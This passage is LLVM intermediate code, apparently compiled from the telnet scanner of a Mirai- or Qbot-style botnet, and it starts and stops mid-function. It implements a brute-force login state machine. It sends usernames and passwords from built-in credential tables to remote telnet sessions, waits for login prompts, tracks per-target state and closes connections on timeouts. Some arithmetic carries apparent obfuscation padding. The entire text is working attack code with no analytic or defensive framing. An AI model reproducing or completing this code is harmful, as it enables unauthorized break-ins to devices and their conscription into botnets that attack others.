  call void @llvm.memset.p0i8.i64(i8* %354, i8 0, i64 1024, i32 1, i1 false)
  %355 = load i32, i32* %2, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %356
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %357, i32 0, i32 2
  store i8 2, i8* %358, align 8
  br label %1329

; <label>:359:                                    ; preds = %310
  br label %379

; <label>:360:                                    ; preds = %251
  %361 = load i32, i32* %3, align 4
  %362 = icmp eq i32 %361, -1
  br i1 %362, label %363, label %378

; <label>:363:                                    ; preds = %360
  %364 = load i32, i32* %2, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %365
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %366, i32 0, i32 0
  %368 = load i32, i32* %367, align 16
  %369 = call i32 @sclose(i32 %368)
  %370 = load i32, i32* %2, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %371
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %372, i32 0, i32 2
  store i8 0, i8* %373, align 8
  %374 = load i32, i32* %2, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %375
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %376, i32 0, i32 3
  store i8 1, i8* %377, align 1
  br label %378

; <label>:378:                                    ; preds = %363, %360
  br label %379

; <label>:379:                                    ; preds = %378, %359
  %380 = load i32, i32* %2, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %381
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %382, i32 0, i32 6
  %384 = load i32, i32* %383, align 4
  %385 = sub i32 0, %384
  %386 = sub i32 0, 10
  %387 = add i32 %385, %386
  %388 = sub i32 0, %387
  %389 = add i32 %384, 10
  %390 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %391 = icmp ult i32 %388, %390
  br i1 %391, label %392, label %407

; <label>:392:                                    ; preds = %379
  %393 = load i32, i32* %2, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %394
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %395, i32 0, i32 0
  %397 = load i32, i32* %396, align 16
  %398 = call i32 @sclose(i32 %397)
  %399 = load i32, i32* %2, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %400
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %401, i32 0, i32 2
  store i8 0, i8* %402, align 8
  %403 = load i32, i32* %2, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %404
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %405, i32 0, i32 3
  store i8 1, i8* %406, align 1
  br label %407

; <label>:407:                                    ; preds = %392, %379
  br label %1328

; <label>:408:                                    ; preds = %67
  %409 = load i32, i32* %2, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %410
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %411, i32 0, i32 6
  %413 = load i32, i32* %412, align 4
  %414 = icmp eq i32 %413, 0
  br i1 %414, label %415, label %421

; <label>:415:                                    ; preds = %408
  %416 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %417 = load i32, i32* %2, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 6
  store i32 %416, i32* %420, align 4
  br label %421

; <label>:421:                                    ; preds = %415, %408
  %422 = load i32, i32* %2, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 16
  %427 = load i32, i32* %2, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %428
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %429, i32 0, i32 8
  %431 = load i8*, i8** %430, align 8
  %432 = load i32, i32* %2, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 7
  %436 = load i16, i16* %435, align 16
  %437 = zext i16 %436 to i32
  %438 = call i32 @readUntil(i32 %426, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %431, i32 1024, i32 %437)
  %439 = icmp ne i32 %438, 0
  br i1 %439, label %440, label %458

; <label>:440:                                    ; preds = %421
  %441 = load i32, i32* %2, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 6
  store i32 0, i32* %444, align 4
  %445 = load i32, i32* %2, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %446
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %447, i32 0, i32 7
  store i16 0, i16* %448, align 16
  %449 = load i32, i32* %2, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 8
  %453 = load i8*, i8** %452, align 8
  call void @llvm.memset.p0i8.i64(i8* %453, i8 0, i64 1024, i32 1, i1 false)
  %454 = load i32, i32* %2, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %455
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %456, i32 0, i32 2
  store i8 3, i8* %457, align 8
  br label %1329

; <label>:458:                                    ; preds = %421
  %459 = load i32, i32* %2, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 8
  %463 = load i8*, i8** %462, align 8
  %464 = call i64 @strlen(i8* %463) #10
  %465 = trunc i64 %464 to i16
  %466 = load i32, i32* %2, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 7
  store i16 %465, i16* %469, align 16
  br label %470

; <label>:470:                                    ; preds = %458
  %471 = load i32, i32* %2, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 6
  %475 = load i32, i32* %474, align 4
  %476 = sub i32 0, 30
  %477 = sub i32 %475, %476
  %478 = add i32 %475, 30
  %479 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %480 = icmp ult i32 %477, %479
  br i1 %480, label %481, label %496

; <label>:481:                                    ; preds = %470
  %482 = load i32, i32* %2, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %483
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %484, i32 0, i32 0
  %486 = load i32, i32* %485, align 16
  %487 = call i32 @sclose(i32 %486)
  %488 = load i32, i32* %2, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %489
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %490, i32 0, i32 2
  store i8 0, i8* %491, align 8
  %492 = load i32, i32* %2, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %493
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %494, i32 0, i32 3
  store i8 1, i8* %495, align 1
  br label %496

; <label>:496:                                    ; preds = %481, %470
  br label %1328

; <label>:497:                                    ; preds = %67
  %498 = load i32, i32* %2, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %499
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %500, i32 0, i32 0
  %502 = load i32, i32* %501, align 16
  %503 = load i32, i32* %2, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %505, i32 0, i32 4
  %507 = load i8, i8* %506, align 2
  %508 = zext i8 %507 to i64
  %509 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %508
  %510 = load i8*, i8** %509, align 8
  %511 = load i32, i32* %2, align 4
  %512 = sext i32 %511 to i64
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %512
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %513, i32 0, i32 4
  %515 = load i8, i8* %514, align 2
  %516 = zext i8 %515 to i64
  %517 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %516
  %518 = load i8*, i8** %517, align 8
  %519 = call i64 @strlen(i8* %518) #10
  %520 = call i64 @send(i32 %502, i8* %510, i64 %519, i32 16384)
  %521 = icmp slt i64 %520, 0
  br i1 %521, label %522, label %537

; <label>:522:                                    ; preds = %497
  %523 = load i32, i32* %2, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %524
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %525, i32 0, i32 0
  %527 = load i32, i32* %526, align 16
  %528 = call i32 @sclose(i32 %527)
  %529 = load i32, i32* %2, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %530
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %531, i32 0, i32 2
  store i8 0, i8* %532, align 8
  %533 = load i32, i32* %2, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 3
  store i8 1, i8* %536, align 1
  br label %1329

; <label>:537:                                    ; preds = %497
  %538 = load i32, i32* %2, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %539
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %540, i32 0, i32 0
  %542 = load i32, i32* %541, align 16
  %543 = call i64 @send(i32 %542, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.27, i32 0, i32 0), i64 2, i32 16384)
  %544 = icmp slt i64 %543, 0
  br i1 %544, label %545, label %560

; <label>:545:                                    ; preds = %537
  %546 = load i32, i32* %2, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 0
  %550 = load i32, i32* %549, align 16
  %551 = call i32 @sclose(i32 %550)
  %552 = load i32, i32* %2, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 2
  store i8 0, i8* %555, align 8
  %556 = load i32, i32* %2, align 4
  %557 = sext i32 %556 to i64
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %557
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %558, i32 0, i32 3
  store i8 1, i8* %559, align 1
  br label %1329

; <label>:560:                                    ; preds = %537
  %561 = load i32, i32* %2, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %562
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %563, i32 0, i32 2
  store i8 4, i8* %564, align 8
  br label %1328

; <label>:565:                                    ; preds = %67
  %566 = load i32, i32* %2, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 6
  %570 = load i32, i32* %569, align 4
  %571 = icmp eq i32 %570, 0
  br i1 %571, label %572, label %578

; <label>:572:                                    ; preds = %565
  %573 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %574 = load i32, i32* %2, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 6
  store i32 %573, i32* %577, align 4
  br label %578

; <label>:578:                                    ; preds = %572, %565
  %579 = load i32, i32* %2, align 4
  %580 = sext i32 %579 to i64
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %580
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %581, i32 0, i32 0
  %583 = load i32, i32* %582, align 16
  %584 = load i32, i32* %2, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %585
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %586, i32 0, i32 8
  %588 = load i8*, i8** %587, align 8
  %589 = load i32, i32* %2, align 4
  %590 = sext i32 %589 to i64
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %590
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %591, i32 0, i32 7
  %593 = load i16, i16* %592, align 16
  %594 = zext i16 %593 to i32
  %595 = call i32 @readUntil(i32 %583, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %588, i32 1024, i32 %594)
  %596 = icmp ne i32 %595, 0
  br i1 %596, label %597, label %629

; <label>:597:                                    ; preds = %578
  %598 = load i32, i32* %2, align 4
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %599
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %600, i32 0, i32 6
  store i32 0, i32* %601, align 4
  %602 = load i32, i32* %2, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %603
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %604, i32 0, i32 7
  store i16 0, i16* %605, align 16
  %606 = load i32, i32* %2, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %607
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %608, i32 0, i32 8
  %610 = load i8*, i8** %609, align 8
  %611 = call i8* @strstr(i8* %610, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #10
  %612 = icmp ne i8* %611, null
  br i1 %612, label %613, label %618

; <label>:613:                                    ; preds = %597
  %614 = load i32, i32* %2, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %615
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %616, i32 0, i32 2
  store i8 5, i8* %617, align 8
  br label %623

; <label>:618:                                    ; preds = %597
  %619 = load i32, i32* %2, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %620
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %621, i32 0, i32 2
  store i8 100, i8* %622, align 8
  br label %623

; <label>:623:                                    ; preds = %618, %613
  %624 = load i32, i32* %2, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %625
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %626, i32 0, i32 8
  %628 = load i8*, i8** %627, align 8
  call void @llvm.memset.p0i8.i64(i8* %628, i8 0, i64 1024, i32 1, i1 false)
  br label %1329

; <label>:629:                                    ; preds = %578
  %630 = load i32, i32* %2, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %631
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %632, i32 0, i32 8
  %634 = load i8*, i8** %633, align 8
  %635 = call i8* @strstr(i8* %634, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0)) #10
  %636 = icmp ne i8* %635, null
  br i1 %636, label %637, label %652

; <label>:637:                                    ; preds = %629
  %638 = load i32, i32* %2, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %639
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %640, i32 0, i32 0
  %642 = load i32, i32* %641, align 16
  %643 = call i32 @sclose(i32 %642)
  %644 = load i32, i32* %2, align 4
  %645 = sext i32 %644 to i64
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %645
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %646, i32 0, i32 2
  store i8 0, i8* %647, align 8
  %648 = load i32, i32* %2, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 3
  store i8 0, i8* %651, align 1
  br label %1329

; <label>:652:                                    ; preds = %629
  %653 = load i32, i32* %2, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 8
  %657 = load i8*, i8** %656, align 8
  %658 = call i64 @strlen(i8* %657) #10
  %659 = trunc i64 %658 to i16
  %660 = load i32, i32* %2, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 7
  store i16 %659, i16* %663, align 16
  br label %664

; <label>:664:                                    ; preds = %652
  %665 = load i32, i32* %2, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %666
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %667, i32 0, i32 6
  %669 = load i32, i32* %668, align 4
  %670 = sub i32 %669, 1060530412
  %671 = add i32 %670, 30
  %672 = add i32 %671, 1060530412
  %673 = add i32 %669, 30
  %674 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %675 = icmp ult i32 %672, %674
  br i1 %675, label %676, label %691

; <label>:676:                                    ; preds = %664
  %677 = load i32, i32* %2, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %678
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %679, i32 0, i32 0
  %681 = load i32, i32* %680, align 16
  %682 = call i32 @sclose(i32 %681)
  %683 = load i32, i32* %2, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %684
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %685, i32 0, i32 2
  store i8 0, i8* %686, align 8
  %687 = load i32, i32* %2, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %688
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %689, i32 0, i32 3
  store i8 1, i8* %690, align 1
  br label %691

; <label>:691:                                    ; preds = %676, %664
  br label %1328

; <label>:692:                                    ; preds = %67
  %693 = load i32, i32* %2, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %694
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %695, i32 0, i32 0
  %697 = load i32, i32* %696, align 16
  %698 = load i32, i32* %2, align 4
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %699
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %700, i32 0, i32 5
  %702 = load i8, i8* %701, align 1
  %703 = zext i8 %702 to i64
  %704 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %703
  %705 = load i8*, i8** %704, align 8
  %706 = load i32, i32* %2, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %707
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %708, i32 0, i32 5
  %710 = load i8, i8* %709, align 1
  %711 = zext i8 %710 to i64
  %712 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %711
  %713 = load i8*, i8** %712, align 8
  %714 = call i64 @strlen(i8* %713) #10
  %715 = call i64 @send(i32 %697, i8* %705, i64 %714, i32 16384)
  %716 = icmp slt i64 %715, 0
  br i1 %716, label %717, label %732

; <label>:717:                                    ; preds = %692
  %718 = load i32, i32* %2, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %719
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %720, i32 0, i32 0
  %722 = load i32, i32* %721, align 16
  %723 = call i32 @sclose(i32 %722)
  %724 = load i32, i32* %2, align 4
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %725
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %726, i32 0, i32 2
  store i8 0, i8* %727, align 8
  %728 = load i32, i32* %2, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 3
  store i8 1, i8* %731, align 1
  br label %1329

; <label>:732:                                    ; preds = %692
  %733 = load i32, i32* %2, align 4
  %734 = sext i32 %733 to i64
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %734
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %735, i32 0, i32 0
  %737 = load i32, i32* %736, align 16
  %738 = call i64 @send(i32 %737, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.27, i32 0, i32 0), i64 2, i32 16384)
  %739 = icmp slt i64 %738, 0
  br i1 %739, label %740, label %755

; <label>:740:                                    ; preds = %732
  %741 = load i32, i32* %2, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %742
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %743, i32 0, i32 0
  %745 = load i32, i32* %744, align 16
  %746 = call i32 @sclose(i32 %745)
  %747 = load i32, i32* %2, align 4
  %748 = sext i32 %747 to i64
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %748
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %749, i32 0, i32 2
  store i8 0, i8* %750, align 8
  %751 = load i32, i32* %2, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 3
  store i8 1, i8* %754, align 1
  br label %1329

; <label>:755:                                    ; preds = %732
  %756 = load i32, i32* %2, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 2
  store i8 6, i8* %759, align 8
  br label %1328

; <label>:760:                                    ; preds = %67
  %761 = load i32, i32* %2, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 6
  %765 = load i32, i32* %764, align 4
  %766 = icmp eq i32 %765, 0
  br i1 %766, label %767, label %773

; <label>:767:                                    ; preds = %760
  %768 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %769 = load i32, i32* %2, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %770
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %771, i32 0, i32 6
  store i32 %768, i32* %772, align 4
  br label %773

; <label>:773:                                    ; preds = %767, %760
  %774 = load i32, i32* %2, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %775
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %776, i32 0, i32 0
  %778 = load i32, i32* %777, align 16
  %779 = load i32, i32* %2, align 4
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %780
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %781, i32 0, i32 8
  %783 = load i8*, i8** %782, align 8
  %784 = load i32, i32* %2, align 4
  %785 = sext i32 %784 to i64
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %785
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %786, i32 0, i32 7
  %788 = load i16, i16* %787, align 16
  %789 = zext i16 %788 to i32
  %790 = call i32 @readUntil(i32 %778, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %783, i32 1024, i32 %789)
  %791 = icmp ne i32 %790, 0
  br i1 %791, label %792, label %867

; <label>:792:                                    ; preds = %773
  %793 = load i32, i32* %2, align 4
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %794
  %796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %795, i32 0, i32 6
  store i32 0, i32* %796, align 4
  %797 = load i32, i32* %2, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 7
  store i16 0, i16* %800, align 16
  %801 = load i32, i32* %2, align 4
  %802 = sext i32 %801 to i64
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %802
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %803, i32 0, i32 8
  %805 = load i8*, i8** %804, align 8
  %806 = call i8* @strstr(i8* %805, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0)) #10
  %807 = icmp ne i8* %806, null
  br i1 %807, label %808, label %828

; <label>:808:                                    ; preds = %792
  %809 = load i32, i32* %2, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 8
  %813 = load i8*, i8** %812, align 8
  call void @llvm.memset.p0i8.i64(i8* %813, i8 0, i64 1024, i32 1, i1 false)
  %814 = load i32, i32* %2, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 0
  %818 = load i32, i32* %817, align 16
  %819 = call i32 @sclose(i32 %818)
  %820 = load i32, i32* %2, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %821
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %822, i32 0, i32 2
  store i8 0, i8* %823, align 8
  %824 = load i32, i32* %2, align 4
  %825 = sext i32 %824 to i64
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %825
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %826, i32 0, i32 3
  store i8 0, i8* %827, align 1
  br label %1329

; <label>:828:                                    ; preds = %792
